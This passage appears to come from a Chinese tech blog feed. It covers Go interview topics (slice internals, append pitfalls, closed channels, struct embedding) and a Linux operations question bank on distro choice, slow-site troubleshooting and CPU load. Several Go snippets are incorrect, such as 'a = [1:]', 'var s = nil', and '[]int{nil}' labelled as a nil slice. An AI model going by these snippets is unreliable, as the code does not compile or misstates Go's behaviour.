class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">array unsafe.Pointer<span class="comment">//指向底层数组的指针</span></span><br><span class="line"><span class="built_in">len</span> <span class="type">int</span><span class="comment">//切片长度</span></span><br><span class="line"><span class="built_in">cap</span> <span class="type">int</span><span class="comment">//切片容量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>容量</strong>表示能够储存的元素数量，<strong>长度</strong>表示已储存的元素数量。</p><h4 id="切片拷贝"><a href="#切片拷贝" class="headerlink" title="切片拷贝"></a>切片拷贝</h4><p>使用<code>copy</code>内置函数拷贝两个切片时，会将源切片的数据逐个拷贝到目的切片指向的数组中，拷贝数量取两个切片的最小值。</p><p>例如长度为10的切片拷贝到长度为5的切片时，将拷贝5个元素。也就是说，拷贝过程中不会发生扩容。</p><p>copy函数有返回值，它返回实际上复制的元素个数，这个值就是两个slice长度的较小值。</p><h4 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a><strong>删除元素</strong></h4><p>很遗憾，Go语言中并没有提供直接删除指定位置元素的方式。不过根据切片的性质，我们可以通过巧妙的拼接切片来达到删除指定数据的目的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="comment">//删除尾部元素</span></span><br><span class="line">a = a[:<span class="built_in">len</span>(a) - <span class="number">1</span>]<span class="comment">//删除尾部一个元素</span></span><br><span class="line">a = a[:<span class="built_in">len</span>(a) - N]<span class="comment">//删除尾部N个元素</span></span><br><span class="line"><span class="comment">//删除头部元素</span></span><br><span class="line">a = [<span class="number">1</span>:]<span class="comment">//删除开头1个元素</span></span><br><span class="line">a = [N:]<span class="comment">//删除开头N个元素</span></span><br><span class="line"><span class="comment">//删除中间元素</span></span><br><span class="line">a = <span class="built_in">append</span>(a[:i], a[i+<span class="number">1</span>:]...)<span class="comment">//删除中间一个元素</span></span><br><span class="line">a = <span class="built_in">append</span>(a[:i], a[i+N:]...)<span class="comment">//删除中间N个元素</span></span><br></pre></td></tr></table></figure><h3 id="切片陷阱"><a href="#切片陷阱" class="headerlink" title="切片陷阱"></a><strong>切片陷阱</strong></h3><ol><li><p>无法做比较</p><p>和数组不同的是，slice无法做比较，因此不能用==来测试两个slice是否拥有相同的元素。标准库里面提供了高度优化的函数<code>bytes.Equal</code>来比较两个字节slice。但是对于其它类型的slice，就必须要自己写函数来比较。</p><p>slice唯一允许的比较操作是和nil进行比较，例如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> slice == <span class="literal">nil</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>空切片和nil切片</p><p>空切片和nil切片是不同的。</p><ul><li>nil切片中，切片的指针指向的是空地址，其长度和容量都为零。nil切片和nil相等。</li><li>空切片，切片的指针指向了一个地址，但其长度和容量也为0，和nil不相等，通常用来表示一个空的集合。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="type">int</span><span class="comment">// s == nil</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="literal">nil</span><span class="comment">// s == nil</span></span><br><span class="line"><span class="keyword">var</span> s = []<span class="type">int</span>&#123;<span class="literal">nil</span>&#125;<span class="comment">// s == nil</span></span><br><span class="line"><span class="keyword">var</span> s = []<span class="type">int</span>&#123;&#125; <span class="comment">// s != nil</span></span><br><span class="line">s := <span class="built_in">make</span>([]<span class="type">int</span>,<span class="number">0</span>)  <span class="comment">// s != nil</span></span><br></pre></td></tr></table></figure></li><li><p>使用range进行切片迭代</p><p>当使用range进行切片迭代时，range创建了每个元素的副本，而不是直接返回对该元素的引用。如果使用该值变量的地址作为每个元素的指针，就会造成错误。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Value: %d, v-addr: %X, Elem-addr: %X&quot;</span>,v, &amp;v, &amp;a[i])</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">output</span><br><span class="line">   Value: <span class="number">1</span>, v-addr: C0000AA058, Elem-addr: C0000CC030</span><br><span class="line">   Value: <span class="number">2</span>, v-addr: C0000AA058, Elem-addr: C0000CC038</span><br><span class="line">   Value: <span class="number">3</span>, v-addr: C0000AA058, Elem-addr: C0000CC040</span><br><span class="line">   Value: <span class="number">4</span>, v-addr: C0000AA058, Elem-addr: C0000CC048</span><br><span class="line">   Value: <span class="number">5</span>, v-addr: C0000AA058, Elem-addr: C0000CC050</span><br></pre></td></tr></table></figure><p>从结果中可以看出，使用range进行迭代时，v的地址是始终不变的，它并不是切片中每个变量的实际地址。而是在使用range进行遍历时，将切片中每个元素都复制到了同一个变量v中。如果错误的将v的地址当作切边元素的地址，将会引发错误。</p><ol><li><p>切片扩容引发的问题</p><p>正因为有扩容机制。所以我们无法保证原始的slice和用append后的结果slice指向同一个底层数组，也无法证明它们就指向不同的底层数组。同样，我们也无法假设旧slice上对元素的操作会或者不会影响新的slice元素。所以，通常我们将append的调用结果再次赋给传入append的slice。</p><p>内置append函数在向切片追加元素时，如果切片存储容量不足以存储新元素，则会把当前切片扩容并产生一个新的切片。</p><p>append函数每次追加元素都有可能触发切片扩容，即有可能返回一个新的切片，这正是append函数声明中返回值为切片的原因，使用时应该总是接收该返回值。</p><p><strong>建议</strong></p><p>使用append函数时，谨记append可能会产生新的切片，并谨慎的处理返回值。</p></li><li><p>append函数误用</p><p>使用append函数时，需要考虑append返回的切片是否跟原切片共享底层的数组。下面这段程序片段，来看看函数返回的结果。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例来源:Go专家编程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AppendDemo</span><span class="params">()</span></span> &#123;</span><br><span class="line">x := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">x = <span class="built_in">append</span>(x, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">y := <span class="built_in">append</span>(x, <span class="number">4</span>)</span><br><span class="line">z := <span class="built_in">append</span>(x, <span class="number">5</span>)</span><br><span class="line">fmt.Println(x)</span><br><span class="line">fmt.Println(y)</span><br><span class="line">fmt.Println(z)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>题目首先创建了一个长度为0，容量为10的切片x，然后向切片x追加了1，2，3三个元素。其底层的数组结构如下图所示</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-20211122200538072-16375827394232.png" alt="image-20211122200538072"></p><p>创建切片y为切片x追加一个元素4后，底层数组结构如下图所示</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-20211122200655204.png" alt="img"></p><p>需要注意的是切片x仍然没有变化，切片x中记录的长度仍为3。继续向x追加元素5后，底层数组结构如下图所示</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/image-20211122200904091-16375829451383.png" alt="image-20211122200904091"></p><p>至此，答案已经非常明确了。当向x继续追加元素5后，切片y的最后一个元素被覆盖掉了。</p><p>此时切片x仍然为[1 2 3]，而切片y和z则为[1 2 3 5]。</p><p><strong>建议</strong></p><p>一般情况下，使用append函数追加新的元素时，都会用原切片变量接收返回值来获得更新</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">append</span>(a, elems...)</span><br></pre></td></tr></table></figure></li><li><p>函数传参</p><p>Go语言中将切片作为函数参数传递会有什么神奇的现象，一起来看看下面这个示例。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;   <span class="comment">//长度为3，容量为3</span></span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">1</span>, <span class="number">10</span>)     <span class="comment">//长度为1，容量为10</span></span><br><span class="line">    test(a,b)</span><br><span class="line">   fmt.Println(<span class="string">&quot;main a =&quot;</span>, a)</span><br><span class="line">    fmt.Println(<span class="string">&quot;main b =&quot;</span>, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(a,b []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    a = <span class="built_in">append</span>(a, <span class="number">4</span>)<span class="comment">//引发扩容，此时返回的a是一个新的切片</span></span><br><span class="line">    b = <span class="built_in">append</span>(b, <span class="number">2</span>)<span class="comment">//没有引发扩容，仍然是原切片</span></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">3</span><span class="comment">//改变a切片元素</span></span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">3</span><span class="comment">//改变b切片元素</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;test a =&quot;</span>, a)<span class="comment">//打印函数内的a切片</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;test b =&quot;</span>, b)<span class="comment">//打印函数内的b切片</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">test a = [<span class="number">3</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]</span><br><span class="line">test b = [<span class="number">3</span> <span class="number">2</span>]</span><br><span class="line">main a = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">main b = [<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>首先，我们创建了两个切片，a切片长度和容量均为3，b切片长度为1，容量为10。将a切片和b切片作为函数参数传入test函数中。</p><p>在test函数中，对a切片和b切片做了如下两点改动</p><ol><li>分别使用append函数在a切片和b切片中追加一个元素</li><li>分别对a切片和b切片的第一个元素做了修改</li></ol><p>分别在主函数中和test函数中输出两个切片，会发现在主函数中和test函数中两个切片好像改了，又好像没改，下面我们就来分析一下。</p><p><strong>理论分析</strong></p><p>当我们将一个切片作为函数参数传递给函数的时候，采用的是值传递，因此我们传递给函数的参数其实是上面这个切片三元组的值拷贝。当我们对切片结构中的指针进行值拷贝的时候，得到的指针还是指向了同一个底层数组。因此我们通过指针对底层数组的值进行修改，从而修改了切片的值。</p><p>但是，当我们以值传递的方式传递上面的结构体的时候，同时也是传递了<code>len</code>和<code>cap</code>的值拷贝，因为这两个成员并不是指针，因此，当我们从函数返回的时候，外层切片结构体的<code>len</code>和<code>cap</code>这两个成员并没有改变。</p><p>所以当我们传递切片给函数的时候，并且在被调函数中通过<code>append</code>操作向切片中增加了值，但是当函数返回的时候，我们看到的切片的值还是没有发生变化，其实底层数组的值是已经改变了的（如果没有触发扩容的话），但是由于长度<code>len</code>没有发生改变，所以我们看到的切片的值也没有发生改变。</p><p><strong>题目再分析</strong></p><p>有了前面的理论基础，我们再来分析一下a，b切片的返回结果。</p><ol><li><p>a切片作为参数传至test函数中，在test中向a切片追加一个元素后，此时触发扩容机制，返回的切片已经不再是原切片，而是一个新的切片。后续对a切片中的第一个元素进行修改也是对新切片进行修改，对老切片不会产生任何影响。</p><p>所以，最终在主函数中a切片仍然为[1 2 3]，而在test函数中a切片变成了[3 2 3 4]。</p></li><li><p>b切片作为参数传至test函数中，在test中向b切片追加一个元素后，不会触发扩容机制，返回的仍然是原切片，所以在后续对b切片的修改都是在原切片中进行的修改。故在test函数中b切片为[3 2]。但是在主函数中确为[3]，可以看出在test中对切片进行修改确实反应到主函数中了，但是由于其len和cap没有改变，len仍为1，所以最终就只输出切片中的第一个元素[3]，但其底层数组的值其实已经改变了。</p></li></ol></li></ol><h4 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h4><ol><li>Go 语言中的数据和 C语言中的类似, 是一片连续的内存空间, 申请时需指定长度, 不能按需扩容</li><li>切片实际上是对数组的引用, 使用 make()函数创建,也可以直接赋值使用, 可以按需扩容, 一次扩容的量为caps 的两倍(&lt;=1.17版本为len小于1024 时, 扩容为caps的两倍, len大于1024时, 会形成一个循环, 每次扩容caps的25%,知道满足容量需求. Go1.18 改变了这个机制)</li></ol><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>Go1.18不再以1024为临界点，而是设定了一个值为256的threshold，以256为临界点；超过256，不再是每次扩容1/4，而是每次增加（旧容量+3<em>256）/4；<br>■ 当新切片需要的容量cap大于两倍扩容的容量，则直接按照新切片需要的容量扩容；<br>■ 当原 slice 容量 &lt; threshold 的时候，新 slice 容量变成原来的 2 倍；<br>■ 当原 slice 容量 &gt; threshold，进入一个循环，每次容量增加（旧容量+3</em>threshold）/4。</p></div><ol start="3"><li>需要注意切片是对数组的引用, 所以当切片被赋值给别的切片变量时, 改变新的切片变量中的值, 会连带改变原切片值</li></ol><h2 id="对已经关闭的channel进行读写操作会发生什么"><a href="#对已经关闭的channel进行读写操作会发生什么" class="headerlink" title="对已经关闭的channel进行读写操作会发生什么?"></a>对已经关闭的channel进行读写操作会发生什么?</h2><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><ol><li>读已经关闭的channel无影响。</li><li><strong>如果在关闭前，通道内部有元素</strong>，会<strong>正确</strong>读到元素的值；如果关闭前通道<strong>无元素</strong>，则会读取到通道内元素类型对应的<strong>零值</strong>。</li><li>若遍历通道，如果通道未关闭，读完元素后，会报死锁的错误。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal <span class="type">error</span>: all goroutines are asleep - deadlock!</span><br></pre></td></tr></table></figure><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><ol><li>写已关闭的通道</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*[Output]: panic: send on closed channel*/</span></span><br></pre></td></tr></table></figure><ol><li>关闭已关闭的通道</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*[Output]: panic: close of closed channel */</span></span><br></pre></td></tr></table></figure><h2 id="Go语言中是如何实现继承的"><a href="#Go语言中是如何实现继承的" class="headerlink" title="Go语言中是如何实现继承的?"></a>Go语言中是如何实现继承的?</h2><p><code>Go</code>与<code>C++</code>、<code>Java</code>这样的面向对象语言不同，使用另外一种方式实现类似继承的效果。<code>Go</code>的<code>method</code>能够指定<strong>接收者</strong>，它可以是一种结构体，并且它可以是任意类型。</p><h3 id="结构体嵌套"><a href="#结构体嵌套" class="headerlink" title="结构体嵌套"></a>结构体嵌套</h3><p>在Go语言中，可以通过结构体组合来实现继承，示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里Student继承了People，具有People的属性</span></span><br><span class="line"><span class="keyword">type</span> People <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span>&#123;</span><br><span class="line">    People</span><br><span class="line">    Grade <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>与<strong>继承</strong>不一样的是，结构体能够通过组合选择所需要继承的方法。</p></div><h3 id="接口封装"><a href="#接口封装" class="headerlink" title="接口封装"></a>接口封装</h3><p>Go 中的接口是一个抽象类型，描述了对象可以接受的行为。通过实现接口，可以让不同的类型拥有相同的方法，从而实现多态性。接口与继承类似，但是接口是基于行为的而不是基于类型的。因此，通过接口实现的多态性可以更加灵活和动态。</p>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统题库（三）</title>
      <link href="/posts/20671.html"/>
      <url>/posts/20671.html</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统题库（三）"><a href="#操作系统题库（三）" class="headerlink" title="操作系统题库（三）"></a>操作系统题库（三）</h1><h2 id="16-如何选择-Linux-操作系统版本？"><a href="#16-如何选择-Linux-操作系统版本？" class="headerlink" title="16.如何选择 Linux 操作系统版本？"></a>16.如何选择 Linux 操作系统版本？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>优先选择熟悉的操作系统，然后选择仍然在官方支持的版本。优先选择熟悉的系统可以更好更快的开发业务，选择官方支持的版本能够保持软件源的更新和及时同步安全补丁，同时有更好的社区支持。</p><p>按我来说就是CentOS 7。</p><p><font style="background-color:#e91e64">答案</font></p><p>一般来讲，桌面用户首选 Ubuntu ；服务器首选 RHEL 或 CentOS ，两者中首选 CentOS 。</p><p>根据具体要求：</p><ul><li>安全性要求较高，则选择 Debian 或者 FreeBSD 。</li><li>需要使用数据库高级服务和电子邮件网络应用的用户可以选择 SUSE 。</li><li>想要新技术新功能可以选择 Feddora ，Feddora 是 RHEL 和 CentOS 的一个测试版和预发布版本。</li><li>【重点】<strong>根据现有状况，绝大多数互联网公司选择 CentOS 。现在比较常用的是 7 系列，现在市场占有大概一半左右。另外的原因是 CentOS 更侧重服务器领域，并且无版权约束</strong>。</li></ul><h2 id="17-如何规划一台-Linux-主机，步骤是怎样？"><a href="#17-如何规划一台-Linux-主机，步骤是怎样？" class="headerlink" title="17. 如何规划一台 Linux 主机，步骤是怎样？"></a>17. 如何规划一台 Linux 主机，步骤是怎样？</h2><p><font style="background-color: #8bc34a">作答</font></p><p><font style="background-color:#e91e64">答案</font></p><p>1、确定机器是做什么用的，比如是做 WEB 、DB、还是游戏服务器。</p><blockquote><p>不同的用途，机器的配置会有所不同。</p></blockquote><ul><li>2、确定好之后，就要定系统需要怎么安装，默认安装哪些系统、分区怎么做。</li><li>3、需要优化系统的哪些参数，需要创建哪些用户等等的。</li></ul><h2 id="⭐❤️😘✨18-请问当用户反馈网站访问慢，你会如何处理？"><a href="#⭐❤️😘✨18-请问当用户反馈网站访问慢，你会如何处理？" class="headerlink" title="⭐❤️😘✨18.请问当用户反馈网站访问慢，你会如何处理？"></a>⭐❤️😘✨18.请问当用户反馈网站访问慢，你会如何处理？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>问题排查：</p><ol><li>排查物理资源是否足够，前提是有资源监控（通常我的服务器都会在业务场景上部署资源监控程序），检查带宽、CPU负载、内存、磁盘空间和读写速度这些资源是否足够。</li><li>排查web反代程序（如Nginx、Caddy、Traefik）配置是否正确。</li><li>排查web程序并发是否达到上线前的压测（QPS、TPS）均值，合理的上线流程需要做好压测，估计并发量。</li><li>做CDN测试，通常网络质量也是影响用户体验的关键数值。</li><li>检测是否有洪水攻击、DDoS、CC，可能存在竞业攻击或者恶意攻击。</li></ol><p>性能优化：</p><ol><li>套CDN，做静态资源的多节点缓存。</li><li>nginx做前端静态资源的压缩（gzip、<em>brotli</em>压缩算法支持）</li><li>前后端分离，前端静态资源设计localstore缓存，减少不必要的网络请求</li><li>后端做合并请求，减少请求数</li><li>增加缓存中间件的设计，使用内存数据库(如redis)，将一些频繁请求又不常变化的数据缓存，提升IO性能。</li><li>增加硬件资源（带宽、CPU、服务器集群等）</li><li>前端做异步加载，一些数据量比较大的请求，使用Ajax</li><li>后端将一些频繁查询数据库的接口，做数据缓存</li><li>后端将一些计算量比较大却不会变动的聚合数据，做磁盘缓存</li></ol><p><font style="background-color:#e91e64">答案</font></p><p><strong>有哪些方面的因素会导致网站网站访问慢？</strong></p><ul><li><p>1、服务器出口带宽不够用</p><blockquote><ul><li>本身服务器购买的出口带宽比较小。一旦并发量大的话，就会造成分给每个用户的出口带宽就小，访问速度自然就会慢。</li><li>跨运营商网络导致带宽缩减。例如，公司网站放在电信的网络上，那么客户这边对接是长城宽带或联通，这也可能导致带宽的缩减。</li></ul></blockquote></li><li><p>2、服务器负载过大，导致响应不过来</p><blockquote><p>可以从两个方面入手分析：</p><ul><li>分析系统负载，使用 w 命令或者 uptime 命令查看系统负载。如果负载很高，则使用 top 命令查看 CPU ，MEM 等占用情况，要么是 CPU 繁忙，要么是内存不够。</li><li>如果这二者都正常，再去使用 sar 命令分析网卡流量，分析是不是遭到了攻击。一旦分析出问题的原因，采取对应的措施解决，如决定要不要杀死一些进程，或者禁止一些访问等。</li></ul></blockquote></li><li><p>3、数据库瓶颈</p><blockquote><ul><li>如果慢查询比较多。那么就要开发人员或 DBA 协助进行 SQL 语句的优化。</li><li>如果数据库响应慢，考虑可以加一个数据库缓存，如 Redis 等。然后，也可以搭建 MySQL 主从，一台 MySQL 服务器负责写，其他几台从数据库负责读。</li></ul></blockquote></li><li><p>4、网站开发代码没有优化好</p><blockquote><ul><li>例如 SQL 语句没有优化，导致数据库读写相当耗时。</li></ul></blockquote><p><strong>针对网站访问慢，怎么去排查？</strong></p></li><li><p>1、首先要确定是用户端还是服务端的问题。当接到用户反馈访问慢，那边自己立即访问网站看看，如果自己这边访问快，基本断定是用户端问题，就需要耐心跟客户解释，协助客户解决问题。</p><blockquote><p>不要上来就看服务端的问题。一定要从源头开始，逐步逐步往下。</p></blockquote></li><li><p>2、如果访问也慢，那么可以利用浏览器的调试功能，看看加载那一项数据消耗时间过多，是图片加载慢，还是某些数据加载慢。</p></li><li><p>3、针对服务器负载情况。查看服务器硬件(网络、CPU、内存)的消耗情况。如果是购买的云主机，比如阿里云，可以登录阿里云平台提供各方面的监控，比如 CPU、内存、带宽的使用情况。</p></li><li><p>4、如果发现硬件资源消耗都不高，那么就需要通过查日志，比如看看 MySQL慢查询的日志，看看是不是某条 SQL 语句查询慢，导致网站访问慢。</p></li></ul><p><strong>怎么去解决？</strong></p><ul><li>1、如果是出口带宽问题，那么久申请加大出口带宽。</li><li>2、如果慢查询比较多，那么就要开发人员或 DBA 协助进行 SQL 语句的优化。</li><li>3、如果数据库响应慢，考虑可以加一个数据库缓存，如 Redis 等等。然后也可以搭建MySQL 主从，一台 MySQL 服务器负责写，其他几台从数据库负责读。</li><li>4、申请购买 CDN 服务，加载用户的访问。</li><li>5、如果访问还比较慢，那就需要从整体架构上进行优化咯。做到专角色专用，多台服务器提供同一个服务。</li></ul><h2 id="19-如何排查-CPU-load-过高问题？"><a href="#19-如何排查-CPU-load-过高问题？" class="headerlink" title="19.如何排查 CPU load 过高问题？"></a>19.如何排查 CPU load 过高问题？</h2><p><font style="background-color: #8bc34a">作答</font></p><ol><li>top查看cpu avg，通常三个数值要低于CPU的核数才能确保资源满足，最佳状态不超过cpu核数*0.75</li><li>top/htop查看cpu占用资源最高的进程</li><li>最后检查程序设计是否合理（例如递归问题）</li></ol><p><font style="background-color:#e91e64">答案</font></p><h6 id="1-首先排查哪些进程cpu占用率高。-通过命令-ps-ux"><a href="#1-首先排查哪些进程cpu占用率高。-通过命令-ps-ux" class="headerlink" title="1. 首先排查哪些进程cpu占用率高。 通过命令 ps ux"></a>1. 首先排查哪些进程cpu占用率高。 通过命令 ps ux</h6><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/731331-20160817133313328-137128375.png" alt="image"></p><h6 id="2-查看对应java进程的每个线程的CPU占用率。通过命令：ps-Lp-15047-cu"><a href="#2-查看对应java进程的每个线程的CPU占用率。通过命令：ps-Lp-15047-cu" class="headerlink" title="2. 查看对应java进程的每个线程的CPU占用率。通过命令：ps -Lp 15047 cu"></a>2. 查看对应java进程的每个线程的CPU占用率。通过命令：ps -Lp 15047 cu</h6><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/731331-20160817133314484-415014403.png" alt="image"></p><h6 id="3-追踪线程内部，查看load过高原因。通过命令：jstack-15047。"><a href="#3-追踪线程内部，查看load过高原因。通过命令：jstack-15047。" class="headerlink" title="3. 追踪线程内部，查看load过高原因。通过命令：jstack 15047。"></a>3. 追踪线程内部，查看load过高原因。通过命令：jstack 15047。</h6><p>或者打印线程 jstack <code>pidof java</code> &gt; stack.out</p><p>查找到对应的threadid, 再反查代码。</p><h2 id="20-Linux-性能调优都有哪几种方法？"><a href="#20-Linux-性能调优都有哪几种方法？" class="headerlink" title="20.Linux 性能调优都有哪几种方法？"></a>20.Linux 性能调优都有哪几种方法？</h2><p><font style="background-color: #8bc34a">作答</font></p><ol><li>设置swap缓存</li></ol><p>我觉得都问这个问题了，你服务器买好点吧。。。。。。low炮，linux开源系统经过长期考验，有什么好调？</p><p><font style="background-color:#e91e64">答案</font></p><p>1、Disabling daemons (关闭 daemons)。</p><p>2、Shutting down the GUI (关闭 GUI)。</p><p>3、Changing kernel parameters (改变内核参数)。</p><p>4、Kernel parameters (内核参数)。</p><p>5、Tuning the processor subsystem (处理器子系统调优)。</p><p>6、Tuning the memory subsystem (内存子系统调优)。</p><p>7、Tuning the file system (文件系统子系统调优)。</p><p>8、Tuning the network subsystem（网络子系统调优)。</p><h2 id="21-Shell-脚本是什么？"><a href="#21-Shell-脚本是什么？" class="headerlink" title="21.Shell 脚本是什么？"></a>21.Shell 脚本是什么？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>Linux内置bash支持shell脚本语言，这是一种解释型编程语言。shell脚本实际上是集成了一些Linux命令和流程控制的代码程序，可以直接在Linux系统中运行，不需要额外安装编译器或者解释器。</p><p><font style="background-color:#e91e64">答案</font></p><p>一个 Shell 脚本是一个文本文件，包含一个或多个命令。作为系统管理员，我们经常需要使用多个命令来完成一项任务，我们可以添加这些所有命令在一个文本文件(Shell 脚本)来完成这些日常工作任务。</p><h2 id="22-什么是默认登录-Shell-？"><a href="#22-什么是默认登录-Shell-？" class="headerlink" title="22.什么是默认登录 Shell ？"></a>22.什么是默认登录 Shell ？</h2><p><font style="background-color: #8bc34a">作答</font></p><p>Linux系统最基本的控制方式是通过CLI，而要操控Linux都是默认通过Bash Shell程序，进行命令行的交互式控制，所以Linux默认登录shell，才提供了交互式操控系统的功能。</p><p><font style="background-color:#e91e64">答案</font></p><p>在 Linux 操作系统，<code>&quot;&quot;/bin/bash&quot;&quot;</code> 是默认登录 Shell，是在创建用户时分配的。</p><p>使用 chsh 命令可以改变默认的 Shell 。示例如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">chsh &lt;用户名&gt; -s &lt;新shell&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">chsh linuxtechi -s /bin/sh</span></span><br></pre></td></tr></table></figure><h2 